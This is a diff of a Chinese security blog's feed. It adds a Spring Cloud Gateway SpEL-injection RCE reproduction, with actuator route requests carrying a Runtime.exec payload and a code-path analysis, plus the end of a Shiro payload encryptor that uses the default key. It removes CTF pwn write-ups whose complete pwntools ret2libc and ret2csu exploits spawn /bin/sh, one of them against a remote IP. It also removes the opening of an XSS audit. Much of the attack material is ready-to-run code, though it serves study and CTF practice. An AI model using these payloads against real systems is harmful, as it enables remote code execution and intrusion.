+        # text = pad(text) 包pycrypto的写法，加密函数可以接受str也可以接受bytess
+        text = pad(text).encode()  # 包pycryptodome 的加密函数不接受str
+        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, IV=self.iv.encode())
+        encrypted_text = cipher.encrypt(text)
+        # 进行64位的编码,返回得到加密后的bytes，decode成字符串
+        return b64encode(encrypted_text).decode('utf-8')
+
+    def decrypt(self, encrypted_text):
+        &quot;&quot;&quot;
+        解密 ：偏移量为key[0:16]；先base64解，再AES解密，后取消补位
+        :param encrypted_text : 已经加密的密文
+        :return:
+        &quot;&quot;&quot;
+        encrypted_text = b64decode(encrypted_text)
+        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, IV=self.iv.encode())
+        decrypted_text = cipher.decrypt(encrypted_text)
+        return unpad(decrypted_text).decode('utf-8')
+
+
+
+
+if __name__ == '__main__':
+    with open(&quot;ser.bin&quot;,encoding='utf-8',errors='ignore') as f:
+        serbin = f.read()
+    enctext = AESCipher(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;).encrypt(serbin)
+    print(enctext)
+</code></pre>
+<p>最后测试发现有dns请求<br>
+<img src="https://limpid94.github.io/post-images/1647965819494.png" alt="" loading="lazy"><br>
+<img src="https://limpid94.github.io/post-images/1647965790395.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[【PWN】Linux栈溢出——ret2csu（XCTF2015-PWN100)]]></title>
-        <id>https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csuxctf2015-pwn100/</id>
-        <link href="https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csuxctf2015-pwn100/">
+        <title type="html"><![CDATA[【Java反序列化】SpringCloud Gateway RCE分析]]></title>
+        <id>https://limpid94.github.io/post/springcloud-gateway-rce-fen-xi/</id>
+        <link href="https://limpid94.github.io/post/springcloud-gateway-rce-fen-xi/">
         </link>
-        <updated>2021-09-23T04:12:55.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="程序逆向及漏洞分析">程序逆向及漏洞分析</h2>
-<p>main函数的内容如下：</p>
-<pre><code class="language-c">int __cdecl main()
+        <updated>2022-03-08T11:58:44.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="环境搭建">环境搭建</h2>
+<p>1、从 https://github.com/spring-cloud/spring-cloud-gateway 下载源码<br>
+2、进入到下载的文件夹中用<code>git check v3.1.0</code>来切换成3.1.0版本。<br>
+3、使用<code>spring-cloud-gateway-sample</code>下的<code>GatewaySampleApplication.java</code>来作为调试的demo。但是要成功运行起来还要修改以下几点<br>
+(1)修改<code>spring-cloud-gateway-sample/src/main/resources/application.yml</code>的内容<br>
+<img src="https://limpid94.github.io/post-images/1646750623356.PNG" alt="" loading="lazy"><br>
+<img src="https://limpid94.github.io/post-images/1646750633573.PNG" alt="" loading="lazy"><br>
+将uri这行改成<code>uri: http://example.com:80</code>，以及将PrefixPath这行改成 <code>- PrefixPath=/</code>，将这样启动后访问对应的uri时就会显示一个example页面<br>
+<img src="https://limpid94.github.io/post-images/1646754832244.png" alt="" loading="lazy"><br>
+4、找到<code>org/springframework/cloud/gateway/sample/GatewaySampleApplication.java</code>，将<code>public RouteLocator customRouteLocator(RouteLocatorBuilder builder)</code>上方的@Bean注释并添加一个自己的路由：</p>
+<pre><code class="language-java">	@Bean
+	public RouteLocator myRoutes(RouteLocatorBuilder builder) {
+		String httpUri = &quot;http://httpbin.org:80&quot;;
+		return builder.routes()
+				.route(p -&gt; p
+						.path(&quot;/get&quot;)
+						.filters(f -&gt; f.addRequestHeader(&quot;Hello&quot;, &quot;World!!!&quot;))
+						.uri(httpUri)
+				)
+				.build();
+	}
+</code></pre>
+<h2 id="简单复现">简单复现</h2>
+<p>首先使用如下数据包来添加一条路由</p>
+<pre><code>POST /actuator/gateway/routes/hacktest HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 335
+
 {
-  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF
-
-  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);
-  memset(&amp;buf[24], 0, 0x4Cu);
-  setbuf(stdout, buf);
-  write(1, buf, strlen(buf));
-  sub_8048484();
-  return 0;
+  &quot;id&quot;: &quot;hacktest&quot;,
+  &quot;filters&quot;: [{
+    &quot;name&quot;: &quot;AddResponseHeader&quot;,
+    &quot;args&quot;: {
+      &quot;name&quot;: &quot;Result&quot;,
+      &quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\&quot;calc.exe\&quot;}).getInputStream()))}&quot;
+    }
+  }],
+  &quot;uri&quot;: &quot;http://example.com&quot;
 }
 </code></pre>
-<pre><code class="language-c">ssize_t sub_8048484()
-{
-  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF
+<p><img src="https://limpid94.github.io/post-images/1646797710126.png" alt="" loading="lazy"><br>
+然后刷新路由能触发RCE</p>
+<pre><code>POST /actuator/gateway/refresh HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
 
-  setbuf(stdin, buf);
-  return read(0, buf, 0x100u);
+</code></pre>
+<p><img src="https://limpid94.github.io/post-images/1646797703551.png" alt="" loading="lazy"><br>
+<img src="https://limpid94.github.io/post-images/1646797697805.png" alt="" loading="lazy"></p>
+<h2 id="原理分析">原理分析</h2>
+<p>根据官方的github上的diff结果，使用<code>GatewayEvaluationContext</code>来代替<code>StandardEvaluationContext</code><br>
+<img src="https://limpid94.github.io/post-images/1646798340898.png" alt="" loading="lazy"><br>
+定位到<code>org/springframework/cloud/gateway/support/ShortcutConfigurable.java</code></p>
+<pre><code class="language-java">	static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue) {
+		Object value;
+		String rawValue = entryValue;
+		if (rawValue != null) {
+			rawValue = rawValue.trim();
+		}
+		if (rawValue != null &amp;&amp; rawValue.startsWith(&quot;#{&quot;) &amp;&amp; entryValue.endsWith(&quot;}&quot;)) {
+			// assume it's spel
+			StandardEvaluationContext context = new StandardEvaluationContext();
+			context.setBeanResolver(new BeanFactoryResolver(beanFactory));
+			Expression expression = parser.parseExpression(entryValue, new TemplateParserContext());
+			value = expression.getValue(context);
+		}
+		else {
+			value = entryValue;
+		}
+		return value;
+	}
+</code></pre>
+<p>查找getValue()的调用处，找到ShortcutType的枚举，并且枚举都重写了normalize()</p>
+<pre><code class="language-java">	enum ShortcutType {
+
+		DEFAULT {
+			@Override
+			public Map&lt;String, Object&gt; normalize(Map&lt;String, String&gt; args, ShortcutConfigurable shortcutConf,
+					SpelExpressionParser parser, BeanFactory beanFactory) {
+				Map&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+				int entryIdx = 0;
+				for (Map.Entry&lt;String, String&gt; entry : args.entrySet()) {
+					String key = normalizeKey(entry.getKey(), entryIdx, shortcutConf, args);
+					Object value = getValue(parser, beanFactory, entry.getValue());
+
+					map.put(key, value);
+					entryIdx++;
+				}
+				return map;
+			}
+		}
+
+</code></pre>
+<p>而shortcutType()调用了ShortcutType枚举的DEFAULT</p>
+<pre><code class="language-java">default ShortcutType shortcutType() {
+		return ShortcutType.DEFAULT;
+	}
+</code></pre>
+<p>接着找到<code>org/springframework/cloud/gateway/support/ConfigurationService.java</code>中的normalizeProperties()调用 shortcutType()。<br>
+而normalizeProperties()又被<code>org/springframework/cloud/gateway/support/ConfigurationService.java</code>的bind()所调用。</p>
+<pre><code class="language-java">		protected abstract T doBind();
+
+		public T bind() {
+			validate();
+			Assert.hasText(this.name, &quot;name may not be empty&quot;);
+			Assert.isTrue(this.properties != null || this.normalizedProperties != null,
+					&quot;properties and normalizedProperties both may not be null&quot;);
+
+			if (this.normalizedProperties == null) {
+				this.normalizedProperties = normalizeProperties();
+			}
+
+			T bound = doBind();
+
+			if (this.eventFunction != null &amp;&amp; this.service.publisher != null) {
+				ApplicationEvent applicationEvent = this.eventFunction.apply(bound, this.normalizedProperties);
+				this.service.publisher.publishEvent(applicationEvent);
+			}
+
+			return bound;
+		}
+</code></pre>
+<p>bind()方法则在<code>org/springframework/cloud/gateway/filter/WeightCalculatorWebFilter.java</code>中的handle方法调用</p>
+<pre><code class="language-java">	public void handle(PredicateArgsEvent event) {
+		Map&lt;String, Object&gt; args = event.getArgs();
+
+		if (args.isEmpty() || !hasRelevantKey(args)) {
+			return;
+		}
+
+		WeightConfig config = new WeightConfig(event.getRouteId());
+
+		this.configurationService.with(config).name(WeightConfig.CONFIG_PREFIX).normalizedProperties(args).bind();
+
+		addWeightConfig(config);
+	}
+</code></pre>
+<p>WeightCalculatorWebFilter与Filter相关。于是参考SpringCloud  API手册：<br>
+<img src="https://limpid94.github.io/post-images/1646845564686.png" alt="" loading="lazy"><br>
+JSON格式就是<br>
+<img src="https://limpid94.github.io/post-images/1646889679695.png" alt="" loading="lazy"><br>
+接下来查找入口<br>
+根据API给出的uri，定位到<code>org/springframework/cloud/gateway/actuate/AbstractGatewayControllerEndpoint.java</code></p>
+<pre><code class="language-java">	@PostMapping(&quot;/routes/{id}&quot;)
+	@SuppressWarnings(&quot;unchecked&quot;)
+	public Mono&lt;ResponseEntity&lt;Object&gt;&gt; save(@PathVariable String id, @RequestBody RouteDefinition route) {
+
+		return Mono.just(route).doOnNext(this::validateRouteDefinition)
+				.flatMap(routeDefinition -&gt; this.routeDefinitionWriter.save(Mono.just(routeDefinition).map(r -&gt; {
+					r.setId(id);
+					log.debug(&quot;Saving route: &quot; + route);
+					return r;
+				})).then(Mono.defer(() -&gt; Mono.just(ResponseEntity.created(URI.create(&quot;/routes/&quot; + id)).build()))))
+				.switchIfEmpty(Mono.defer(() -&gt; Mono.just(ResponseEntity.badRequest().build())));
+	}
+</code></pre>
+<p>先查看RouteDefinition：<br>
+<img src="https://limpid94.github.io/post-images/1646891522030.png" alt="" loading="lazy"><br>
+其中的filters是FilterDefinition类型的列表。再追入FilterDefinition中：<br>
+<img src="https://limpid94.github.io/post-images/1646891612111.png" alt="" loading="lazy"><br>
+从中看到两个参数：name和args。<br>
+之后返回到AbstractGatewayControllerEndpoint的save方法中。该方法内会调用validateRouteDefinition方法来对filter的有效性做了一个校验：</p>
+<pre><code class="language-java">	private void validateRouteDefinition(RouteDefinition routeDefinition) {
+		Set&lt;String&gt; unavailableFilterDefinitions = routeDefinition.getFilters().stream().filter(rd -&gt; !isAvailable(rd))
+				.map(FilterDefinition::getName).collect(Collectors.toSet());
+
+		Set&lt;String&gt; unavailablePredicatesDefinitions = routeDefinition.getPredicates().stream()
+				.filter(rd -&gt; !isAvailable(rd)).map(PredicateDefinition::getName).collect(Collectors.toSet());
+		if (!unavailableFilterDefinitions.isEmpty()) {
+			handleUnavailableDefinition(FilterDefinition.class.getSimpleName(), unavailableFilterDefinitions);
+		}
+		else if (!unavailablePredicatesDefinitions.isEmpty()) {
+			handleUnavailableDefinition(PredicateDefinition.class.getSimpleName(), unavailablePredicatesDefinitions);
+		}
+	}
+···
+而是否有效的关键方法是isAvailable()
+```java
+	private boolean isAvailable(FilterDefinition filterDefinition) {
+		return GatewayFilters.stream()
+				.anyMatch(gatewayFilterFactory -&gt; filterDefinition.getName().equals(gatewayFilterFactory.name()));
+	}
+</code></pre>
+<p>此时用动态调试方法打印出filterDefinition中已经存在的Filter的名字。</p>
+<pre><code>AddRequestHeader
+MapRequestHeader
+AddRequestParameter
+AddResponseHeader
+ModifyRequestBody
+DedupeResponseHeader
+ModifyResponseBody
+CacheRequestBody
+PrefixPath
+PreserveHostHeader
+RedirectTo
+RemoveRequestHeader
+RemoveRequestParameter
+RemoveResponseHeader
+RewritePath
+Retry
+SetPath
+SecureHeaders
+SetRequestHeader
+SetRequestHostHeader
+SetResponseHeader
+RewriteResponseHeader
+RewriteLocationResponseHeader
+SetStatus
+SaveSession
+StripPrefix
+RequestHeaderToRequestUri
+RequestSize
+RequestHeaderSize
+</code></pre>
+<p>此处使用 AddRequestHeader，对应<code>org/springframework/cloud/gateway/route/builder/GatewayFilterSpec.java</code>的addRequestHeader</p>
+<pre><code class="language-java">	/**
+	 * Adds a request header to the request before it is routed by the Gateway.
+	 * @param headerName the header name
+	 * @param headerValue the header value
+	 * @return a {@link GatewayFilterSpec} that can be used to apply additional filters
+	 */
+	public GatewayFilterSpec addRequestHeader(String headerName, String headerValue) {
+		return filter(getBean(AddRequestHeaderGatewayFilterFactory.class)
+				.apply(c -&gt; c.setName(headerName).setValue(headerValue)));
+	}
+</code></pre>
+<p>因此在filters中需要包含name和value两个关键词，而且这里两个参数都是String类型，因此需要将Runtime下的getRuntime的exec方法弄成字节流进行输入，否则会因为类型不匹配报错而终止未完成的流程。</p>
+<h3 id="spel语句构造">SpEL语句构造</h3>
+<p>SpEL语法的T()会返回Object类，可以借助其获取某个类的静态方法<code>T(全限定类名).方法名()</code>。<br>
+例如java上调用Runtime为：</p>
+<pre><code class="language-java">Runtime.getRuntime.exec(&quot;calc.exe&quot;);
+</code></pre>
+<p>用T()操作符可以写成</p>
+<pre><code class="language-java">T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)
+</code></pre>
+<p>结合本文的情况，由于最终是String类型，所以还需要借用<code>org.springframework.util.StreamUtils</code>的<code>copyToByteArray</code>，因此可以写成</p>
+<pre><code class="language-java">#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(Runtime).getRuntime().exec(\&quot;calc.exe\&quot;).getInputStream()))}
+</code></pre>
+<p>##完整数据包：</p>
+<pre><code>{
+  &quot;id&quot;: &quot;hacktest&quot;,
+  &quot;filters&quot;: [{
+    &quot;name&quot;: &quot;AddResponseHeader&quot;,
+    &quot;args&quot;: {
+      &quot;name&quot;: &quot;Result&quot;,
+      &quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\&quot;notepad.exe\&quot;}).getInputStream()))}&quot;
+    }
+  }],
+  &quot;uri&quot;: &quot;http://example.com&quot;
 }
 </code></pre>
-<p>可以看到在sub_8048484中read函数读入0x100大小的字符，而buf只有108个字符，因此猜测存在栈溢出。</p>
-<h2 id="安全检查">安全检查</h2>
-<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1632371042409.PNG" alt="" loading="lazy"></figure>
-<h2 id="偏移计算">偏移计算</h2>
-<p>从sub_8048484函数的buf长度时108可以知道，padding长度位108+fack_ebp(4) = 112</p>
-<h2 id="构造exp">构造EXP</h2>
-<h3 id="方法一使用ret2libc的常见思路">方法一：使用ret2libc的常见思路</h3>
-<p>这里使用正常的ROP思路：<br>
-第一步：泄露write函数的地址<br>
-第二步：通过write函数的地址使用LibcSearcher查找对应的libc版本<br>
-第三步：计算libc基址<br>
-第四步：计算出system函数和read函数的的真实地址<br>
-第五步：先使用read函数将/bin/sh函数读入bss段中，再将其送入system函数中<br>
-因此完整的exp如下：</p>
-<pre><code class="language-python"># coding:utf-8
-
-from pwn import * 
-from LibcSearcher import *
-
-# context.log_level = 'debug'
-p = process(&quot;./xctf2015pwn200&quot;))
-elf = ELF(&quot;./xctf2015pwn200&quot;)
-
-main_addr = 0x080484BE
-write_got = elf.got['write']
-write_plt = elf.plt['write']
-read_got = elf.got['read']
-read_plt = elf.plt['read']
-bss_addr = elf.bss()+0x100
-pop_ebx_addr = 0x0804836c
-
-
-log.success('  main_addr ==&gt; '+ hex(main_addr))
-log.success('  write_got ==&gt; '+ hex(write_got))
-log.success('  write_plt ==&gt; '+ hex(write_plt))
-log.success('  read_got ==&gt; '+ hex(read_got))
-log.success('  read_plt ==&gt; '+ hex(read_plt))
-log.success('  bss_addr ==&gt; '+ hex(bss_addr))
-
-
-# Using normal ROP
-##*********************************************
-## leaking write address to search libc version.
-##*********************************************
-payload = b'A'*112  
-payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
-p.recvuntil('!\n')
-p.send(payload)
-write_addr = u32(p.recv(4))
-log.success('write_addr ==&gt; '+hex(write_addr))
-
-payload = b'A'*112 
-payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4) p.recvuntil('!\n')
-p.send(payload)
-read_addr = u32(p.recv(4))
-log.success('read_addr ==&gt; '+hex(read_addr))
-
-libc = LibcSearcher('write',write_addr)
-libc.add_condition('read',read_addr)
-
-libc_base = write_addr - libc.dump('write')
-log.success('libc_base ==&gt; '+hex(libc_base))
-gets_addr = libc_base + libc.dump('gets')
-log.info('gets_addr ===&gt; '+hex(gets_addr))
-system_addr = libc_base + libc.dump('system')
-log.info('system_addr ===&gt; '+hex(system_addr))
-##******************************************************************
-## read /bin/sh into bss segment area and use system to execute it
-##******************************************************************
-read_addr = libc_base + libc.dump('read')
-log.success('read_addr ==&gt; '+hex(read_addr))
-payload = b'A'*112 
-payload += p32(read_addr) + p32(system_addr) + p32(0) + p32(bss_addr) + p32(8)
-payload += p32(bss_addr) + p32(0xdeadbeef) + p32(bss_addr)
-p.recvuntil('!\n')
-p.send(payload)
-p.sendline('/bin/sh\x00')
-
-p.interactive()
-</code></pre>
-<p>在本地复现成功了<br>
-<img src="https://limpid94.github.io/post-images/1632371993642.PNG" alt="" loading="lazy"><br>
-但是在远程环境下就复现失败了：<br>
-<img src="https://limpid94.github.io/post-images/1632372027668.PNG" alt="" loading="lazy"><br>
-原因是没办法使用LibcSearcher找到远端使用的libc.因此改用DynELF</p>
-<pre><code class="language-python">#coding:utf-8
-from pwn import *
-
-# context.log_level = 'debug'
-# r = process('./xctf2015pwn200')
-r = remote('111.200.241.244', 57161)
-elf = ELF('./xctf2015pwn200')
-
-main_addr = 0x080484BE
-write_got = elf.got['write']
-write_plt = elf.plt['write']
-read_got = elf.got['read']
-read_plt = elf.plt['read']
-bss_addr = elf.bss()+0x100
-
-log.success('  main_addr ==&gt; '+ hex(main_addr))
-log.success('  write_got ==&gt; '+ hex(write_got))
-log.success('  write_plt ==&gt; '+ hex(write_plt))
-log.success('  read_got ==&gt; '+ hex(read_got))
-log.success('  read_plt ==&gt; '+ hex(read_plt))
-log.success('  bss_addr ==&gt; '+ hex(bss_addr))
-
-def leak(address):
-    payload0 = 'A'*112
-    payload0 += p32(write_plt) + p32(0x80483d0) + p32(1) + p32(address) + p32(4)
-    r.recvuntil('!\n')
-    r.send(payload0)
-    data = r.recv(4)
-    return data
-d = DynELF(leak,elf = ELF('xctf2015pwn200'))
-system_addr = d.lookup('system','libc')
-log.success(' system_addr ==&gt; '+hex(system_addr))
-
-log.info(' Start to getshell ... ')
-payload = 'A'*112
-payload += p32(read_plt) + p32(system_addr) + p32(0) + p32(bss_addr) + p32(8) + p32(0xdeadbeef) + p32(bss_addr)
-r.recvuntil('!\n')
-r.send(payload)
-r.send('/bin/sh\x00')
-
-r.interactive()
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[【PWN】Linux栈溢出——ret2csu]]></title>
-        <id>https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csu/</id>
-        <link href="https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csu/">
-        </link>
-        <updated>2021-09-20T17:21:18.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="调试过程">调试过程</h2>
-<h3 id="程序源码">程序源码</h3>
-<pre><code class="language-c">#undef _FORTIFY_SOURCE
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-
-void vulnerable_function() {
-	char buf[128];
-	read(STDIN_FILENO, buf, 512);
-}
-
-int main(int argc, char** argv) {
-	write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
-	vulnerable_function();
-}
-</code></pre>
-<p>本程序可以看到代码一开始输出Hello, World之后进入有漏洞的函数中，在该函数中buf的大小为128，而读入的长度可以达到512，因此可能存在栈溢出漏洞</p>
-<h3 id="保护检查">保护检查</h3>
-<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1632159306393.PNG" alt="" loading="lazy"></figure>
-<h3 id="确定偏移">确定偏移</h3>
-<p>先生成300长度的padding用来确定offset值。由于x64架构下若地址大于0x00007fffffffffff时会抛出错误，但是在ret的时候RSP已经指向保存的返回地址。<br>
-<img src="https://limpid94.github.io/post-images/1632160350766.PNG" alt="" loading="lazy"><br>
-因此打印出RSP的值就可以得到offset的值。<br>
-经过测量之后长度为136个字符。</p>
-<h3 id="构造ropgadget">构造ROPGadget</h3>
-<p>X64架构的函数传参和X86还是很不一样的。前者会将函数的前6个参数放入6个不同的寄存器中。因此在构造gadget的时候需要分别找出操作 rdi, rsi, rdx, rcx, r8, r9的汇编指令。<br>
-本程序用ROPgadget找不出单纯对以上6个寄存器的操作指令，但是可以考虑从<code>__libc_csu_init</code>的汇编指令中初始化环境的时候对rdi, rsi, rdx, rcx, r8, r9的操作。</p>
-<pre><code>00000000004005a0 &lt;__libc_csu_init&gt;:
-  4005a0:	48 89 6c 24 d8       	mov    QWORD PTR [rsp-0x28],rbp
-  4005a5:	4c 89 64 24 e0       	mov    QWORD PTR [rsp-0x20],r12
-  4005aa:	48 8d 2d 73 08 20 00 	lea    rbp,[rip+0x200873]        # 600e24 &lt;__init_array_end&gt;
-  4005b1:	4c 8d 25 6c 08 20 00 	lea    r12,[rip+0x20086c]        # 600e24 &lt;__init_array_end&gt;
-  4005b8:	4c 89 6c 24 e8       	mov    QWORD PTR [rsp-0x18],r13
-  4005bd:	4c 89 74 24 f0       	mov    QWORD PTR [rsp-0x10],r14
-  4005c2:	4c 89 7c 24 f8       	mov    QWORD PTR [rsp-0x8],r15
-  4005c7:	48 89 5c 24 d0       	mov    QWORD PTR [rsp-0x30],rbx
-  4005cc:	48 83 ec 38          	sub    rsp,0x38
-  4005d0:	4c 29 e5             	sub    rbp,r12
-  4005d3:	41 89 fd             	mov    r13d,edi
-  4005d6:	49 89 f6             	mov    r14,rsi
-  4005d9:	48 c1 fd 03          	sar    rbp,0x3
-  4005dd:	49 89 d7             	mov    r15,rdx
-  4005e0:	e8 1b fe ff ff       	call   400400 &lt;_init&gt;
-  4005e5:	48 85 ed             	test   rbp,rbp
-  4005e8:	74 1c                	je     400606 &lt;__libc_csu_init+0x66&gt;
-  4005ea:	31 db                	xor    ebx,ebx
-  4005ec:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
-  4005f0:	4c 89 fa             	mov    rdx,r15
-  4005f3:	4c 89 f6             	mov    rsi,r14
-  4005f6:	44 89 ef             	mov    edi,r13d
-  4005f9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
-  4005fd:	48 83 c3 01          	add    rbx,0x1
-  400601:	48 39 eb             	cmp    rbx,rbp
-  400604:	75 ea                	jne    4005f0 &lt;__libc_csu_init+0x50&gt;
-  400606:	48 8b 5c 24 08       	mov    rbx,QWORD PTR [rsp+0x8]
-  40060b:	48 8b 6c 24 10       	mov    rbp,QWORD PTR [rsp+0x10]
-  400610:	4c 8b 64 24 18       	mov    r12,QWORD PTR [rsp+0x18]
-  400615:	4c 8b 6c 24 20       	mov    r13,QWORD PTR [rsp+0x20]
-  40061a:	4c 8b 74 24 28       	mov    r14,QWORD PTR [rsp+0x28]
-  40061f:	4c 8b 7c 24 30       	mov    r15,QWORD PTR [rsp+0x30]
-  400624:	48 83 c4 38          	add    rsp,0x38
-  400628:	c3                   	ret    
-  400629:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
-</code></pre>
-<p>从<code>0x400606</code>~<code>0x400628</code>这部分可以控制rbx、rbp、r12、r13、r14、r15寄存器；而<code>0x4005F0</code>~<code>0x400604</code>则可以将r13、r14、r15的值分别赋值给RDI,RSI,RDX。<br>
-syscall函数在传递参数的时候顺序如下<br>
-<img src="https://limpid94.github.io/post-images/1632234018536.PNG" alt="" loading="lazy"><br>
-因此将<code>0x400606</code><sub>`0x400628`作为Gadget的第一部分，然后跟上需要压入的数据，再用`0x4005F0`</sub><code>0x400604</code>作为第二部分，利用<code>0x4005f0</code>~<code>0x4005f9</code>来调用我们需要的函数，而传入的参数就是之前压入的数据。<br>
-当然，此处有几个值得关注的细节。首先为了能利用<code>0x4005f9</code>的调用，应该给rbx赋值为0，同时将需要调用的函数给r12，也就是先压入<code>[rsp+0x18]</code>的栈中。而执行完这条指令后rbx+1，会跟rbp相比较，若不相同则会跳转。为了控制其不进行跳转需要给rbp赋值为1。</p>
-<p>依据以上的分析，可以写出大致的payload</p>
-<pre><code class="language-python">def csu (rbx, rbp, r12, r13, r14, r15, ret_addr):
-    gadget1_addr = 0x400606
-    gadget2_addr = 0x4005f0
-    payload = b'A'*0x88 + p64(gadget1_addr) + p64(0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(gadget2_addr) + b'B'*0x38 + p64(ret_addr)
-    log.info('sending payload ....')
-    p.send(payload)
-</code></pre>
-<p>之后需要考虑如何获取函数的真实地址以及如何计算出libc中的system地址并在可用的地址写入<code>/bin/sh\x00</code><br>
-由于没有给出Libc地版本，此处使用LibcSearcher来进行查找</p>
-<pre><code class="language-python">libc = LibcSearcher('write',write_addr)
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1632247589196.PNG" alt="" loading="lazy"></figure>
-<p>具体的攻击流程 ：</p>
-<ul>
-<li>第一步：泄露read和write的真实地址并用其地址在LibcSearcher中进行查找libc的版本</li>
-<li>第二步：调用read函数往bss段写入system的真实地址和<code>/bin/sh\x00</code></li>
-<li>第三步：调用system函数并将<code>/bin/sh\x00</code>传入。</li>
-</ul>
-<h2 id="完整exp">完整EXP</h2>
-<pre><code class="language-python"># coding:utf-8
-
-from pwn import *
-from LibcSearcher import *
-
-# context.log_level = 'debug'
-p = process(&quot;./level5_1&quot;)
-elf = ELF(&quot;level5_1&quot;)
-
-write_got = elf.got['write']
-main_addr = elf.symbols['main']
-read_got = elf.got['read']
-bss_segm = elf.bss()
-log.info('main_addr: '+hex(main_addr))
-log.info('write_got: '+hex(write_got))
-log.info('bss_addr: '+hex(bss_segm))
-# raw_input('&gt;&gt;&gt;&gt;')
-
-def csu (rbx, rbp, r12, r13, r14, r15, ret_addr):
-    gadget1_addr = 0x400606
-    gadget2_addr = 0x4005f0
-    payload = b'A'*0x88 + p64(gadget1_addr) + p64(0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(gadget2_addr) + b'B'*0x38 + p64(ret_addr)
-    log.info('sending payload ....')
-    p.send(payload)
-    sleep(0.5)
-    
-
-# ROP 1 --&gt; try to 
-# payload = padding + gadget1_addr + rbx + rbp + r12 + 13 + r14 + r15
-# payload += gadget2_addr + padding(0x38) + ret_addr 
-log.info('Try to search libc version')
-p.recvuntil('d\n')
-
-csu(0, 1, write_got, 1, write_got, 8, main_addr)
-write_addr = u64(p.recv(8))
-p.recvuntil('d\n')
-csu(0, 1, write_got, 1, read_got, 8, main_addr)   
-read_addr = u64(p.recv(8))
-log.info('Write_addr: '+ hex(write_addr))
-log.info('read_addr: '+ hex(read_addr))
-libc = LibcSearcher('write',write_addr)
-libc.add_condition('read',read_addr) 
-libc_base = write_addr - libc.dump('write')
-system_addr = libc_base + libc.dump('system')
-log.info('libc_addr: '+hex(libc_base))
-log.info('system_addr: '+hex(system_addr))
-
-# ROP2 --&gt; try to write '/bin/sh' to bss segment
-log.info('Try to write \'/bin/sh\' to bss segment')
-p.recvuntil('d\n')
-csu(0, 1, read_got, 0, bss_segm, 16, main_addr)  
-p.send(p64(system_addr) + b'/bin/sh\x00')  #\x00\x00\x00\x00\x00\x00\x00\x00
-
-# ROP2 --&gt; try to getshell
-log.info('Try to get shell')
-p.recvuntil('d\n')
-csu(0, 1, bss_segm, bss_segm+8, 0, 0, 0xdeadbeef) 
-p.interactive()
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://limpid94.github.io/post-images/1632248303258.PNG" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[【Java-Web】某仿商城源码审计]]></title>
-        <id>https://limpid94.github.io/post/java-web-mou-fang-shang-cheng-yuan-ma-shen-ji/</id>
-        <link href="https://limpid94.github.io/post/java-web-mou-fang-shang-cheng-yuan-ma-shen-ji/">
-        </link>
-        <updated>2021-08-21T09:32:59.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="下载地址">下载地址：</h2>
-<p>https://gitee.com/project_team/Tmall_demo</p>
-<h2 id="安装">安装：</h2>
-<p>##审计过程</p>
-<h3 id="xss">XSS</h3>
-<h4 id="反射型xss">反射型XSS</h4>
-<p>程序运行起来后看到搜索框，遂尝试xss<br>
-<img src="https://limpid94.github.io/post-images/1629538917561.PNG" alt="" loading="lazy"><br>
-<img src="https://limpid94.github.io/post-images/1629539009046.PNG" alt="" loading="lazy"><br>
-具体代码的查找则根据前端的html代码定位到对应的jsp，然后根据jsp中的EL表达式对全局进行搜索，找到对应的Controller。<br>
-首先从数据包中的URI截取<code>product?product_name=</code>作为关键词进行查找<br>
-<img src="https://limpid94.github.io/post-images/1629558183309.PNG" alt="" loading="lazy"><br>
